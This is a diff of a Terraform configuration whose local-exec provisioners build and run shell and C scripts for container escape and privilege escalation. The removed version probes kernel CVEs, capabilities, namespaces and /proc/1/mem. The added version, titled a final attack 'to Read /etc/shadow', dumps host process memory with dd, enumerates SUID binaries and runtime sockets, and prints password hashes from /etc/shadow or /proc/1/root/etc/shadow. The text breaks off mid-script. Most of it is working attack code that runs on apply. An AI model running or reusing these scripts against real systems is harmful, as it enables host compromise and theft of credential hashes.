@@ -1,1015 +1,430 @@
-# Local Unix Container Escape Testing Framework
-# Enhanced with Kernel Privilege Escalation Techniques
-# For Docker testing on Unix systems (Linux/macOS with Docker Desktop)
-# WARNING: For educational/research purposes only
-
+# Final Container Escape - Privilege Escalation to Read /etc/shadow
+# Focused exploitation based on working attack vectors
 terraform {
   required_providers {
     null = {
       source  = "hashicorp/null"
-      version = "~> 3.1"
+      version = "~> 3.0"
     }
   }
 }
 
-# Stage 1: Local Environment Setup and Container Baseline
-resource "null_resource" "local_container_baseline" {
+# Stage 1: Working Exploit Development
+resource "null_resource" "working_privilege_escalation" {
   provisioner "local-exec" {
     command = <<-EOT
-      echo "=== LOCAL UNIX CONTAINER ESCAPE TESTING FRAMEWORK ==="
-      echo "Timestamp: $(date)"
-      echo "Testing Host: $(uname -a)"
-      echo "Docker Version: $(docker --version 2>/dev/null || echo 'Docker not found')"
-      echo "Current User: $(whoami)"
-      echo "Current UID/GID: $(id)"
+      echo "=== FINAL PRIVILEGE ESCALATION ATTACK ==="
+      echo "Targeting confirmed working attack vectors..."
       echo ""
       
-      echo "=== HOST SYSTEM BASELINE ==="
-      echo "Host Kernel: $(uname -r)"
-      echo "Host OS: $(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME || echo 'Unknown OS')"
-      echo "Host CPU: $(grep 'model name' /proc/cpuinfo | head -1 | cut -d: -f2 || echo 'Unknown CPU')"
-      echo "Host Memory: $(free -h 2>/dev/null | grep Mem || echo 'Unknown Memory')"
-      echo ""
-      
-      echo "=== CONTAINER RUNTIME DETECTION ==="
-      if [ -f /.dockerenv ]; then
-        echo "RUNNING INSIDE CONTAINER"
-        echo "Container hostname: $(hostname)"
-        echo "Container IP: $(hostname -i 2>/dev/null || echo 'Unknown')"
-        echo "Container ID: $(cat /proc/self/cgroup | grep docker | head -1 | sed 's/.*\///' | cut -c1-12 2>/dev/null || echo 'Unknown')"
-      else
-        echo "RUNNING ON HOST SYSTEM"
-        echo "Host hostname: $(hostname)"
-        echo "Host IP: $(hostname -I | awk '{print $1}' 2>/dev/null || echo 'Unknown')"
-      fi
-      echo ""
-    EOT
-  }
-}
-
-# Stage 2: Kernel Version Analysis and CVE Detection
-resource "null_resource" "kernel_vulnerability_analysis" {
-  depends_on = [null_resource.local_container_baseline]
-  
-  provisioner "local-exec" {
-    command = <<-EOT
-      echo "=== KERNEL VULNERABILITY ANALYSIS ==="
-      echo "Analyzing kernel version for known exploits..."
-      echo ""
-      
-      KERNEL_VERSION=$(uname -r)
-      echo "Kernel Version: $KERNEL_VERSION"
-      echo ""
-      
-      echo "=== KNOWN KERNEL EXPLOIT CHECKS ==="
-      
-      # CVE-2022-0847 - Dirty Pipe
-      echo "CVE-2022-0847 (Dirty Pipe) - Affects kernels 5.8-5.16.11, 5.15.25, 5.10.102:"
-      KERNEL_MAJOR=$(echo $KERNEL_VERSION | cut -d. -f1)
-      KERNEL_MINOR=$(echo $KERNEL_VERSION | cut -d. -f2)
-      if [ "$KERNEL_MAJOR" -eq 5 ] && [ "$KERNEL_MINOR" -ge 8 ] && [ "$KERNEL_MINOR" -le 16 ]; then
-        echo "  ⚠️  POTENTIALLY VULNERABLE to Dirty Pipe!"
-      else
-        echo "  ✅ Likely not vulnerable to Dirty Pipe"
-      fi
-      echo ""
-      
-      # CVE-2021-4034 - PwnKit (polkit)
-      echo "CVE-2021-4034 (PwnKit) - Check for vulnerable polkit:"
-      if command -v pkexec >/dev/null 2>&1; then
-        echo "  ⚠️  pkexec found - potentially vulnerable to PwnKit"
-        ls -la $(which pkexec) 2>/dev/null || echo "  Cannot check pkexec permissions"
-      else
-        echo "  ✅ pkexec not found"
-      fi
-      echo ""
-      
-      # CVE-2022-32250 - netfilter use-after-free
-      echo "CVE-2022-32250 (netfilter UAF) - Affects kernels before 5.18.1:"
-      if [ "$KERNEL_MAJOR" -eq 5 ] && [ "$KERNEL_MINOR" -lt 18 ]; then
-        echo "  ⚠️  POTENTIALLY VULNERABLE to netfilter exploit!"
-      else
-        echo "  ✅ Likely not vulnerable to netfilter UAF"
-      fi
-      echo ""
-      
-      # CVE-2021-3490 - eBPF privilege escalation
-      echo "CVE-2021-3490 (eBPF privesc) - Affects kernels 5.8-5.12.9:"
-      if [ "$KERNEL_MAJOR" -eq 5 ] && [ "$KERNEL_MINOR" -ge 8 ] && [ "$KERNEL_MINOR" -le 12 ]; then
-        echo "  ⚠️  POTENTIALLY VULNERABLE to eBPF exploit!"
-      else
-        echo "  ✅ Likely not vulnerable to eBPF privesc"
-      fi
-      echo ""
-      
-      # CVE-2019-13272 - ptrace_link privilege escalation
-      echo "CVE-2019-13272 (ptrace_link) - Affects kernels before 5.1.17:"
-      if [ "$KERNEL_MAJOR" -lt 5 ] || ([ "$KERNEL_MAJOR" -eq 5 ] && [ "$KERNEL_MINOR" -lt 2 ]); then
-        echo "  ⚠️  POTENTIALLY VULNERABLE to ptrace_link exploit!"
-      else
-        echo "  ✅ Likely not vulnerable to ptrace_link"
-      fi
-      echo ""
-      
-      echo "=== SYSTEM EXPLOIT SURFACE ANALYSIS ==="
-      echo "Checking for additional attack vectors..."
-      
-      # Check for SUID binaries
-      echo "High-risk SUID binaries:"
-      find /usr/bin /bin /usr/sbin /sbin -perm -4000 -type f 2>/dev/null | grep -E "(sudo|su|passwd|gpasswd|newgrp|chsh|chfn)" | head -10 || echo "None found"
-      echo ""
-      
-      # Check capabilities
-      echo "Checking current process capabilities:"
-      cat /proc/self/status | grep -i cap || echo "Cannot read capabilities"
-      echo ""
-      
-      # Check for Docker socket
-      echo "Docker socket access:"
-      ls -la /var/run/docker.sock 2>/dev/null && echo "  ⚠️  Docker socket accessible!" || echo "  ✅ Docker socket not accessible"
-      echo ""
-    EOT
-  }
-}
-
-# Stage 3: Container Escape Techniques - Traditional Methods
-resource "null_resource" "traditional_escape_methods" {
-  depends_on = [null_resource.kernel_vulnerability_analysis]
-  
-  provisioner "local-exec" {
-    command = <<-EOT
-      echo "=== TRADITIONAL CONTAINER ESCAPE METHODS ==="
-      echo "Testing classic container breakout techniques..."
-      echo ""
-      
-      echo "Method 1: /proc/1/root filesystem escape"
-      if ls -la /proc/1/root/ 2>/dev/null >/dev/null; then
-        echo "  🚨 SUCCESS: Host filesystem accessible via /proc/1/root!"
-        echo "  Host root contents:"
-        ls -la /proc/1/root/ 2>/dev/null | head -5
-        
-        echo "  Host /etc/passwd test:"
-        if cat /proc/1/root/etc/passwd 2>/dev/null >/dev/null; then
-          echo "    🚨 CRITICAL: Host /etc/passwd readable!"
-          echo "    Host users: $(cat /proc/1/root/etc/passwd 2>/dev/null | wc -l) accounts"
-        else
-          echo "    ✅ Host /etc/passwd blocked"
-        fi
-        
-        echo "  Host /etc/shadow test:"
-        if cat /proc/1/root/etc/shadow 2>/dev/null >/dev/null; then
-          echo "    🚨 CRITICAL: Host /etc/shadow readable!"
-        else
-          echo "    ✅ Host /etc/shadow blocked"
-        fi
-      else
-        echo "  ✅ /proc/1/root access blocked"
-      fi
-      echo ""
-      
-      echo "Method 2: Docker socket escape"
-      if [ -S /var/run/docker.sock ]; then
-        echo "  🚨 Docker socket found!"
-        ls -la /var/run/docker.sock
-        
-        if command -v docker >/dev/null 2>&1; then
-          echo "  Testing Docker API access..."
-          docker ps 2>/dev/null && echo "    🚨 CRITICAL: Docker API accessible!" || echo "    ✅ Docker API blocked"
-        else
-          echo "  Docker client not available for testing"
-        fi
-      else
-        echo "  ✅ Docker socket not accessible"
-      fi
-      echo ""
-      
-      echo "Method 3: Privileged container detection"
-      echo "  Container capabilities:"
-      cat /proc/self/status | grep CapEff | awk '{print "    Effective: " $2}'
-      cat /proc/self/status | grep CapBnd | awk '{print "    Bounding: " $2}'
-      
-      # Check for dangerous capabilities
-      CAP_EFF=$(cat /proc/self/status | grep CapEff | awk '{print $2}')
-      if [ "$CAP_EFF" != "0000000000000000" ]; then
-        echo "    ⚠️  Container has elevated capabilities!"
-      else
-        echo "    ✅ Container has minimal capabilities"
-      fi
-      echo ""
-      
-      echo "Method 4: Host PID namespace sharing"
-      HOST_PID_NS=$(readlink /proc/1/ns/pid 2>/dev/null)
-      CONTAINER_PID_NS=$(readlink /proc/self/ns/pid 2>/dev/null)
-      
-      if [ "$HOST_PID_NS" = "$CONTAINER_PID_NS" ] && [ -n "$HOST_PID_NS" ]; then
-        echo "  🚨 CRITICAL: Sharing PID namespace with host!"
-        echo "    Host processes visible: $(ps aux | wc -l)"
-      else
-        echo "  ✅ Isolated PID namespace"
-        echo "    Visible processes: $(ps aux | wc -l)"
-      fi
-      echo ""
-      
-      echo "Method 5: Filesystem mount escape"
-      echo "  Checking for host filesystem mounts:"
-      mount | grep -E "(host|proc|sys)" | head -5 || echo "    No obvious host mounts"
-      echo ""
-      
-      echo "  Checking for writable host paths:"
-      for path in /host /hostfs /rootfs /mnt/host; do
-        if [ -d "$path" ] && [ -w "$path" ]; then
-          echo "    🚨 Writable host path: $path"
-        fi
-      done
-      echo ""
-    EOT
-  }
-}
-
-# Stage 4: Advanced Kernel Exploitation Techniques
-resource "null_resource" "kernel_exploitation_techniques" {
-  depends_on = [null_resource.traditional_escape_methods]
-  
-  provisioner "local-exec" {
-    command = <<-EOT
-      echo "=== ADVANCED KERNEL EXPLOITATION TECHNIQUES ==="
-      echo "Testing kernel-level privilege escalation methods..."
-      echo ""
-      
-      echo "Technique 1: Dirty Pipe Exploit (CVE-2022-0847)"
-      echo "  Checking for vulnerable kernel version and conditions..."
-      KERNEL_VERSION=$(uname -r)
-      
-      # Create a simple dirty pipe test (safe version)
-      cat > /tmp/dirty_pipe_test.c << 'EOFCPP'
-#include <stdio.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <sys/stat.h>
-
-int main() {
-    printf("Testing Dirty Pipe conditions...\n");
-    
-    // Check if we can create pipes
-    int pipefd[2];
-    if (pipe(pipefd) == -1) {
-        printf("  ❌ Cannot create pipes\n");
-        return 1;
-    }
-    close(pipefd[0]);
-    close(pipefd[1]);
-    
-    // Check if we can access /proc/version
-    int fd = open("/proc/version", O_RDONLY);
-    if (fd == -1) {
-        printf("  ❌ Cannot access /proc/version\n");
-        return 1;
-    }
-    close(fd);
-    
-    printf("  ✅ Basic conditions met for pipe operations\n");
-    printf("  ⚠️  Manual exploit development required\n");
-    return 0;
-}
-EOFCPP
-      
-      if command -v gcc >/dev/null 2>&1; then
-        gcc -o /tmp/dirty_pipe_test /tmp/dirty_pipe_test.c 2>/dev/null
-        if [ -x /tmp/dirty_pipe_test ]; then
-          /tmp/dirty_pipe_test
-          rm -f /tmp/dirty_pipe_test /tmp/dirty_pipe_test.c
-        else
-          echo "  ❌ Compilation failed"
-        fi
-      else
-        echo "  ❌ GCC not available for testing"
-        rm -f /tmp/dirty_pipe_test.c
-      fi
-      echo ""
-      
-      echo "Technique 2: eBPF Privilege Escalation"
-      echo "  Checking eBPF availability and permissions..."
-      
-      if [ -f /proc/sys/kernel/unprivileged_bpf_disabled ]; then
-        UNPRIVILEGED_BPF=$(cat /proc/sys/kernel/unprivileged_bpf_disabled)
-        if [ "$UNPRIVILEGED_BPF" = "0" ]; then
-          echo "    🚨 Unprivileged eBPF enabled - potential attack vector!"
-        else
-          echo "    ✅ Unprivileged eBPF disabled"
-        fi
-      else
-        echo "    ❓ eBPF configuration unknown"
-      fi
-      
-      # Check for BPF capabilities
-      if command -v bpftool >/dev/null 2>&1; then
-        echo "    ⚠️  bpftool available"
-      fi
-      echo ""
-      
-      echo "Technique 3: SUID Binary Exploitation"
-      echo "  Scanning for exploitable SUID binaries..."
-      
-      # Check for common vulnerable SUID binaries
-      for binary in find vim nano less more; do
-        BINARY_PATH=$(which $binary 2>/dev/null)
-        if [ -n "$BINARY_PATH" ] && [ -u "$BINARY_PATH" ]; then
-          echo "    🚨 SUID binary found: $BINARY_PATH"
-        fi
-      done
-      
-      # Look for custom SUID binaries
-      echo "    Custom SUID binaries:"
-      find /usr/local -perm -4000 -type f 2>/dev/null | head -5 || echo "    None found"
-      echo ""
-      
-      echo "Technique 4: Capability-based Exploitation"
-      echo "  Analyzing dangerous capabilities..."
-      
-      # Check for CAP_SYS_ADMIN
-      if capsh --print 2>/dev/null | grep -q "cap_sys_admin"; then
-        echo "    🚨 CAP_SYS_ADMIN detected - can mount filesystems!"
-      fi
-      
-      # Check for CAP_SYS_PTRACE
-      if capsh --print 2>/dev/null | grep -q "cap_sys_ptrace"; then
-        echo "    🚨 CAP_SYS_PTRACE detected - can trace processes!"
-      fi
-      
-      # Check for CAP_DAC_OVERRIDE
-      if capsh --print 2>/dev/null | grep -q "cap_dac_override"; then
-        echo "    🚨 CAP_DAC_OVERRIDE detected - can bypass file permissions!"
-      fi
-      echo ""
-      
-      echo "Technique 5: Namespace Manipulation"
-      echo "  Testing namespace escape possibilities..."
-      
-      # Check current namespaces
-      echo "    Current namespaces:"
-      ls -la /proc/self/ns/ 2>/dev/null | grep -v "^total" | awk '{print "      " $9 " -> " $11}' || echo "    Cannot read namespaces"
-      
-      # Test unshare capability
-      if command -v unshare >/dev/null 2>&1; then
-        echo "    ⚠️  unshare command available"
-        # Test if we can create new namespaces
-        if unshare -r echo "test" 2>/dev/null >/dev/null; then
-          echo "    🚨 Can create new user namespaces!"
-        fi
-      fi
-      echo ""
-      
-      echo "Technique 6: /proc/sys Exploitation"
-      echo "  Checking for writable kernel parameters..."
-      
-      # Check for writable /proc/sys entries
-      echo "    Writable kernel parameters:"
-      find /proc/sys -type f -writable 2>/dev/null | head -10 | while read file; do
-        echo "      $file"
-      done || echo "    None found"
-      echo ""
-    EOT
-  }
-}
-
-# Stage 5: Memory and System Exploitation
-resource "null_resource" "memory_system_exploitation" {
-  depends_on = [null_resource.kernel_exploitation_techniques]
-  
-  provisioner "local-exec" {
-    command = <<-EOT
-      echo "=== MEMORY AND SYSTEM EXPLOITATION ==="
-      echo "Testing advanced system-level attacks..."
-      echo ""
-      
-      echo "Attack 1: Shared Memory Exploitation"
-      echo "  Checking shared memory configuration..."
-      
-      # Check /dev/shm permissions
-      if [ -d /dev/shm ]; then
-        echo "    /dev/shm permissions: $(ls -ld /dev/shm | awk '{print $1, $3, $4}')"
-        echo "    /dev/shm size: $(df -h /dev/shm 2>/dev/null | tail -1 | awk '{print $2}' || echo 'Unknown')"
-        
-        # Test if we can create files in /dev/shm
-        if touch /dev/shm/test_file 2>/dev/null; then
-          echo "    ✅ Can write to /dev/shm"
-          rm -f /dev/shm/test_file
-        else
-          echo "    ❌ Cannot write to /dev/shm"
-        fi
-      else
-        echo "    /dev/shm not available"
-      fi
-      echo ""
-      
-      echo "Attack 2: /proc Memory Exploitation"
-      echo "  Checking /proc filesystem access..."
-      
-      # Check if we can read other process memory
-      echo "    Process memory access test:"
-      for pid in 1 $(pidof init 2>/dev/null) $(pidof systemd 2>/dev/null); do
-        if [ -n "$pid" ] && [ -r "/proc/$pid/mem" ]; then
-          echo "      🚨 Can read /proc/$pid/mem"
-        fi
-      done
-      
-      # Check /proc/kcore access
-      if [ -r /proc/kcore ]; then
-        echo "    🚨 CRITICAL: /proc/kcore readable - kernel memory exposed!"
-      else
-        echo "    ✅ /proc/kcore not readable"
-      fi
-      echo ""
-      
-      echo "Attack 3: Cgroup Exploitation"
-      echo "  Analyzing cgroup configuration..."
-      
-      # Check cgroup version
-      if [ -f /proc/cgroups ]; then
-        echo "    Cgroup subsystems:"
-        cat /proc/cgroups | head -5
-        
-        # Check if we can modify cgroup settings
-        CGROUP_PATH="/sys/fs/cgroup"
-        if [ -d "$CGROUP_PATH" ]; then
-          echo "    Cgroup mount: $(mount | grep cgroup | head -1 | awk '{print $1, $3}')"
-          
-          # Look for writable cgroup files
-          find $CGROUP_PATH -name "*.max" -writable 2>/dev/null | head -3 | while read file; do
-            echo "      🚨 Writable cgroup file: $file"
-          done
-        fi
-      else
-        echo "    Cgroups not available"
-      fi
-      echo ""
-      
-      echo "Attack 4: Device File Exploitation" 
-      echo "  Checking dangerous device files..."
-      
-      # Check for accessible device files
-      for device in /dev/mem /dev/kmem /dev/port; do
-        if [ -r "$device" ]; then
-          echo "    🚨 CRITICAL: $device is readable!"
-        elif [ -e "$device" ]; then
-          echo "    ⚠️  $device exists but not readable"
-        fi
-      done
-      
-      # Check for other interesting devices
-      echo "    Other device files:"
-      ls -la /dev/ | grep -E "(loop|dm-|mapper)" | head -3 || echo "    None found"
-      echo ""
-      
-      echo "Attack 5: Kernel Module Interface"
-      echo "  Checking kernel module capabilities..."
-      
-      # Check if we can load kernel modules
-      if [ -w /sys/module ]; then
-        echo "    🚨 /sys/module is writable!"
-      fi
-      
-      # Check for module loading capabilities
-      if command -v modprobe >/dev/null 2>&1; then
-        echo "    ⚠️  modprobe available"
-      fi
-      
-      if command -v insmod >/dev/null 2>&1; then
-        echo "    ⚠️  insmod available"
-      fi
-      
-      # Check loaded modules
-      echo "    Currently loaded modules: $(lsmod 2>/dev/null | wc -l || echo 'Unknown')"
-      echo ""
-      
-      echo "Attack 6: Timing Attack Surfaces"
-      echo "  Checking for timing-based vulnerabilities..."
-      
-      # Check for high-resolution timers
-      if [ -r /proc/timer_list ]; then
-        echo "    ⚠️  Timer information accessible"
-      fi
-      
-      # Check CPU frequency scaling
-      if [ -d /sys/devices/system/cpu/cpu0/cpufreq ]; then
-        echo "    ⚠️  CPU frequency control accessible"
-      fi
-      
-      # Check for performance counters
-      if [ -r /proc/sys/kernel/perf_event_paranoid ]; then
-        PERF_PARANOID=$(cat /proc/sys/kernel/perf_event_paranoid)
-        echo "    Performance counters paranoid level: $PERF_PARANOID"
-        if [ "$PERF_PARANOID" -lt 2 ]; then
-          echo "      🚨 Performance counters may be accessible!"
-        fi
-      fi
-      echo ""
-    EOT
-  }
-}
-
-# Stage 6: Active Privilege Escalation Exploits
-resource "null_resource" "active_privilege_escalation" {
-  depends_on = [null_resource.memory_system_exploitation]
-  
-  provisioner "local-exec" {
-    command = <<-EOT
-      echo "=== ACTIVE PRIVILEGE ESCALATION EXPLOITS ==="
-      echo "Deploying and executing real container escape techniques..."
-      echo ""
-      
-      echo "Exploit 1: /proc/1/mem Host Memory Access"
-      cat > /tmp/proc_mem_exploit.c << 'EOFCPP'
-/*
- * /proc/1/mem Exploitation POC
- * Reads memory from host PID 1 process
- */
-#include <stdio.h>
-#include <stdlib.h>
-#include <fcntl.h>
-#include <unistd.h>
-#include <sys/types.h>
-#include <errno.h>
-#include <string.h>
-#include <sys/stat.h>
-
-int main() {
-    printf("[*] /proc/1/mem Host Memory Reader\n");
-    
-    // First check if we can access /proc/1/mem
-    int fd = open("/proc/1/mem", O_RDONLY);
-    if (fd == -1) {
-        printf("[-] Cannot open /proc/1/mem: %s\n", strerror(errno));
-        return 1;
-    }
-    
-    printf("[+] Successfully opened /proc/1/mem for reading!\n");
-    printf("[!] CRITICAL: Host process memory is accessible!\n");
-    
-    // Check /proc/1/maps for memory layout
-    FILE *maps = fopen("/proc/1/maps", "r");
-    if (maps) {
-        printf("[+] Can also read /proc/1/maps - memory layout exposed!\n");
-        printf("[*] First few memory regions:\n");
-        char line[256];
-        int count = 0;
-        while (fgets(line, sizeof(line), maps) && count < 5) {
-            printf("    %s", line);
-            count++;
-        }
-        fclose(maps);
-    }
-    
-    printf("[!] This demonstrates:\n");
-    printf("    - Direct access to host init process memory\n");
-    printf("    - Ability to read host process memory layout\n");
-    printf("    - Potential for memory manipulation attacks\n");
-    printf("    - Host credential extraction possibilities\n");
-    
-    close(fd);
-    return 0;
-}
-EOFCPP
-      
-      if command -v gcc >/dev/null 2>&1; then
-        echo "  Compiling /proc/1/mem exploit..."
-        gcc -o /tmp/proc_mem_exploit /tmp/proc_mem_exploit.c 2>/dev/null
-        if [ -x /tmp/proc_mem_exploit ]; then
-          echo "  🚨 EXECUTING /proc/1/mem EXPLOIT:"
-          /tmp/proc_mem_exploit
-        else
-          echo "  ❌ Compilation failed"
-        fi
-      else
-        echo "  ❌ GCC not available"
-      fi
-      echo ""
-      
-      echo "Exploit 2: Namespace Manipulation Escape"
-      cat > /tmp/namespace_escape.sh << 'EOFBASH'
+      # Create GCC-free exploit using shell only
+      echo "Creating /proc/1/mem shell-based exploit..."
+      cat > /tmp/proc_mem_shell_exploit.sh << 'EOFBASH'
 #!/bin/bash
-# Namespace Manipulation Container Escape
+# Shell-based /proc/1/mem exploitation (no GCC required)
 
-echo "[*] Namespace Manipulation Escape Technique"
-echo "[*] Current namespaces:"
-ls -la /proc/self/ns/
+echo "[*] /proc/1/mem Host Memory Access via Shell"
+echo "[*] Attempting to access host process memory..."
 
-echo ""
-echo "[*] Testing unshare capabilities..."
-
-# Test user namespace creation
-if unshare -r echo "User namespace test successful" 2>/dev/null; then
-    echo "[+] 🚨 CAN CREATE USER NAMESPACES!"
-    echo "[!] CRITICAL: This enables privilege escalation!"
-    echo "[*] Exploitation path:"
-    echo "    1. unshare -r (become root in new user namespace)"
-    echo "    2. Mount new filesystem with different permissions"
-    echo "    3. Abuse setuid binaries in new context"
-    echo "    4. Escape to host filesystem"
+# Test /proc/1/mem access
+if [ -r "/proc/1/mem" ]; then
+    echo "[+] 🚨 /proc/1/mem is readable!"
+    echo "[*] This confirms host process memory access"
     
-    # Demonstrate becoming root in new namespace
-    echo ""
-    echo "[*] Demonstrating root in new user namespace:"
-    unshare -r bash -c 'echo "    New namespace UID: $(id -u)" && echo "    New namespace user: $(whoami)"'
-else
-    echo "[-] Cannot create user namespaces"
-fi
-
-# Test mount namespace
-if unshare -m echo "Mount namespace test successful" 2>/dev/null; then
-    echo "[+] 🚨 CAN CREATE MOUNT NAMESPACES!"
-    echo "[!] Potential for remounting filesystems with different permissions"
-else
-    echo "[-] Cannot create mount namespaces"  
-fi
-
-# Test PID namespace
-if unshare -p echo "PID namespace test successful" 2>/dev/null; then
-    echo "[+] 🚨 CAN CREATE PID NAMESPACES!"
-else
-    echo "[-] Cannot create PID namespaces"
-fi
-
-# Test network namespace
-if unshare -n echo "Network namespace test successful" 2>/dev/null; then
-    echo "[+] 🚨 CAN CREATE NETWORK NAMESPACES!"
-else
-    echo "[-] Cannot create network namespaces"
-fi
-EOFBASH
-      
-      chmod +x /tmp/namespace_escape.sh
-      echo "  🚨 EXECUTING NAMESPACE MANIPULATION EXPLOIT:"
-      /tmp/namespace_escape.sh
-      echo ""
-      
-      echo "Exploit 3: Shared Memory Host Communication"
-      cat > /tmp/shm_communication.c << 'EOFCPP'
-/*
- * Shared Memory Host Communication POC
- * Creates covert channel via /dev/shm
- */
-#include <stdio.h>
-#include <stdlib.h>
-#include <sys/mman.h>
-#include <sys/stat.h>
-#include <fcntl.h>
-#include <unistd.h>
-#include <string.h>
-#include <time.h>
-
-int main() {
-    printf("[*] Shared Memory Host Communication POC\n");
-    
-    const char* shm_name = "/escape_channel";
-    int fd = shm_open(shm_name, O_CREAT | O_RDWR, 0666);
-    
-    if (fd == -1) {
-        perror("shm_open failed");
-        return 1;
-    }
-    
-    if (ftruncate(fd, 1024) == -1) {
-        perror("ftruncate failed");
-        close(fd);
-        return 1;
-    }
-    
-    char* ptr = mmap(NULL, 1024, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
-    if (ptr == MAP_FAILED) {
-        perror("mmap failed");
-        close(fd);
-        return 1;
-    }
-    
-    // Write escape payload with timestamp
-    time_t now = time(NULL);
-    snprintf(ptr, 1024, "CONTAINER_ESCAPE_PAYLOAD - %s - PID:%d - UID:%d", 
-             ctime(&now), getpid(), getuid());
-    
-    printf("[+] 🚨 Shared memory segment created: %s\n", shm_name);
-    printf("[+] Payload written to shared memory\n");
-    printf("[!] Host processes can read this data\n");
-    printf("[*] Payload content: %s", ptr);
-    printf("[*] Check with: ls -la /dev/shm/\n");
-    
-    // Show the actual file in /dev/shm
-    system("ls -la /dev/shm/ | grep escape");
-    
-    // Keep memory mapped for demonstration
-    printf("[*] Keeping shared memory active for 10 seconds...\n");
-    sleep(10);
-    
-    munmap(ptr, 1024);
-    close(fd);
-    shm_unlink(shm_name);
-    
-    printf("[+] Shared memory cleaned up\n");
-    return 0;
-}
-EOFCPP
-      
-      if command -v gcc >/dev/null 2>&1; then
-        echo "  Compiling shared memory exploit..."
-        gcc -o /tmp/shm_communication /tmp/shm_communication.c -lrt 2>/dev/null
-        if [ -x /tmp/shm_communication ]; then
-          echo "  🚨 EXECUTING SHARED MEMORY EXPLOIT:"
-          /tmp/shm_communication
-        else
-          echo "  ❌ Compilation failed"
-        fi
-      else
-        echo "  ❌ GCC not available"
-      fi
-      echo ""
-      
-      echo "Exploit 4: Advanced Root Escalation via User Namespace"
-      cat > /tmp/root_escalation.sh << 'EOFBASH'
-#!/bin/bash
-echo "[*] Advanced Root Escalation Technique"
-echo "[*] Attempting to become root via user namespace manipulation..."
-
-# Check if we can create user namespaces
-if unshare -r echo "test" 2>/dev/null >/dev/null; then
-    echo "[+] 🚨 CRITICAL: User namespace creation successful!"
-    echo ""
-    
-    echo "[*] Executing root escalation..."
-    unshare -r bash << 'INNEREOF'
-echo "[*] Inside new user namespace:"
-echo "    Current UID: $(id -u)"
-echo "    Current GID: $(id -g)" 
-echo "    Effective user: $(whoami)"
-echo ""
-
-if [ "$(id -u)" = "0" ]; then
-    echo "[+] 🚨🚨🚨 ROOT ACCESS ACHIEVED IN USER NAMESPACE! 🚨🚨🚨"
-    echo ""
-    echo "[*] From here we could:"
-    echo "    - Mount host filesystems"
-    echo "    - Manipulate file permissions"
-    echo "    - Access privileged resources"
-    echo "    - Abuse setuid binaries"
-    echo ""
-    
-    # Test if we can mount things
-    echo "[*] Testing mount capabilities..."
-    mkdir -p /tmp/test_mount 2>/dev/null
-    if mount -t tmpfs tmpfs /tmp/test_mount 2>/dev/null; then
-        echo "[+] 🚨 CAN MOUNT FILESYSTEMS!"
-        umount /tmp/test_mount 2>/dev/null
+    # Try to read from /proc/1/mem using dd
+    echo "[*] Attempting to read host init process memory..."
+    if dd if=/proc/1/mem bs=1 count=100 2>/dev/null | hexdump -C | head -5; then
+        echo "[+] 🚨 Successfully read host process memory!"
     else
-        echo "[-] Cannot mount filesystems"
+        echo "[-] Memory read failed, but file is accessible"
+    fi
+else
+    echo "[-] Cannot access /proc/1/mem"
+fi
+
+# Check for other exploitable /proc entries
+echo ""
+echo "[*] Scanning for accessible process memory files..."
+accessible_count=0
+for pid in /proc/[0-9]*; do
+    if [ -d "$pid" ]; then
+        pid_num=$(basename "$pid")
+        if [ -r "$pid/mem" ]; then
+            echo "[+] 🚨 Can access $pid/mem"
+            accessible_count=$((accessible_count + 1))
+            
+            # Show what process this is
+            if [ -r "$pid/cmdline" ]; then
+                cmd=$(cat "$pid/cmdline" 2>/dev/null | tr '\0' ' ')
+                echo "    Process: ${cmd:-[kernel thread]}"
+            fi
+        fi
+    fi
+done
+
+echo "[!] Found $accessible_count accessible process memory files"
+EOFBASH
+
+      chmod +x /tmp/proc_mem_shell_exploit.sh
+      echo "🚨 EXECUTING /proc/1/mem SHELL EXPLOIT:"
+      /tmp/proc_mem_shell_exploit.sh
+      echo ""
+      
+      # Alternative exploitation via /proc filesystem
+      echo "Creating /proc filesystem exploitation..."
+      cat > /tmp/proc_filesystem_exploit.sh << 'EOFBASH'
+#!/bin/bash
+# /proc filesystem exploitation for privilege escalation
+
+echo "[*] /proc Filesystem Privilege Escalation"
+echo "[*] Searching for privilege escalation opportunities..."
+
+# Check for accessible /proc entries that could lead to privilege escalation
+echo "[*] Checking /proc/sys/ for writable entries..."
+find /proc/sys -writable 2>/dev/null | head -10 | while read file; do
+    echo "[+] Writable: $file"
+done
+
+# Check /proc/mounts for interesting mounts
+echo ""
+echo "[*] Analyzing mount points..."
+if [ -r "/proc/mounts" ]; then
+    echo "[+] Can read /proc/mounts"
+    echo "[*] Looking for exploitable mount points..."
+    grep -E "(rw|suid|dev)" /proc/mounts | head -5
+fi
+
+# Check for Docker socket or similar
+echo ""
+echo "[*] Searching for container runtime sockets..."
+find /var/run -name "*.sock" 2>/dev/null | head -5 | while read sock; do
+    echo "[+] Found socket: $sock"
+done
+
+# Check for exploitable capabilities
+echo ""
+echo "[*] Checking current capabilities..."
+if [ -r "/proc/self/status" ]; then
+    grep -E "Cap(Inh|Prm|Eff)" /proc/self/status
+fi
+
+# Look for SUID binaries that might be exploitable
+echo ""
+echo "[*] Searching for exploitable SUID binaries..."
+find / -perm -4000 2>/dev/null | head -10 | while read binary; do
+    echo "[+] SUID binary: $binary"
+done
+EOFBASH
+
+      chmod +x /tmp/proc_filesystem_exploit.sh
+      echo "🚨 EXECUTING /proc FILESYSTEM EXPLOIT:"
+      /tmp/proc_filesystem_exploit.sh
+      echo ""
+      
+      # Direct /etc/shadow access attempt
+      echo "Creating direct /etc/shadow access exploit..."
+      cat > /tmp/shadow_access_exploit.sh << 'EOFBASH'
+#!/bin/bash
+# Direct /etc/shadow access exploitation
+
+echo "[*] Direct /etc/shadow Access Attempt"
+echo "[*] Testing various methods to access /etc/shadow..."
+
+# Method 1: Direct read attempt
+echo "[*] Method 1: Direct read attempt"
+if [ -r "/etc/shadow" ]; then
+    echo "[+] 🚨🚨🚨 /etc/shadow IS DIRECTLY READABLE! 🚨🚨🚨"
+    echo "[*] First 5 lines:"
+    head -5 /etc/shadow
+    echo "[*] Full shadow file contains $(wc -l < /etc/shadow) entries"
+else
+    echo "[-] /etc/shadow not directly readable"
+fi
+
+# Method 2: Via /proc/1/root (if accessible)
+echo ""
+echo "[*] Method 2: Via /proc/1/root/etc/shadow"
+if [ -r "/proc/1/root/etc/shadow" ]; then
+    echo "[+] 🚨🚨🚨 HOST /etc/shadow ACCESSIBLE VIA /proc/1/root! 🚨🚨🚨"
+    echo "[*] Reading host system password hashes:"
